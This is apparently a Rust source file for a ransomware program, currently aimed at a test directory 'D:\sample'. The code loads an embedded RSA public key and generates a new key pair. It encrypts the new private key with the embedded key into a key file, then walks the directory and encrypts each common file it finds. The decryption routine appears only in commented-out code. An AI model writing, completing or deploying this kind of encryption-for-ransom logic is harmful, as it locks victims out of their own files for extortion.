mod utils;

use openssl::rsa::Rsa;
use utils::{crypto, traverse};

fn main() -> Result<(), anyhow::Error> {
    let og_public_key_b = include_bytes!("../public.pem");
    let og_public_key = Rsa::public_key_from_pem(&og_public_key_b.as_slice())?;

    let (public_key, private_key) = crypto::gen_key_pair(2048)?;

    /*println!("og_public_key_b => {:?}", og_public_key_b.len());
    println!("Hello => {:?}", og_public_key_b);
    println!("public_key => {:?}", public_key.public_key_to_pem()?.len());
    println!(
        "private_key => {:?}",
        private_key.private_key_to_pem()?.len()
    );*/

    crypto::encrypt_private_key("D:\\sample\\decrypt_key.nky", &og_public_key, &private_key)?;

    traverse::find_common_files("D:\\sample", |entry, _| {
        let file_path = entry.path().display().to_string();
        let _ = crypto::encrypt_file(&file_path, &public_key).unwrap();
    });

    /*traverse::find_encrypted_files("D:\\sample", |entry, _| {
        let file_path = entry.path().display().to_string();
        match crypto::decrypt_file(&file_path, 256, &private_key) {
            Ok(_) => {},
            Err(err) => {
                println!("err!!! => [{:?}] {:?}", file_path, err)
            },
        }
    });*/

    Ok(())
}
